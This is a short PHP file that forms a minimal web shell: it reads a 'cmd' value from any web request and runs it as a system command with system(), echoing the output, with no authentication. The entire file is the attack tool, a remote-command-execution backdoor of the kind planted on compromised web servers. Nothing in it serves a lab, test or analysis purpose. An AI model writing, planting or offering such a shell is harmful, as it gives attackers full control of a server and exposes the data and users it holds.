<?php

if (isset($_REQUEST['cmd'])){
    echo "<p>";
    $command = $_REQUEST['cmd'];
    system($command);
    echo "</p>";
}
else{
    echo "No command input given.";
}

?>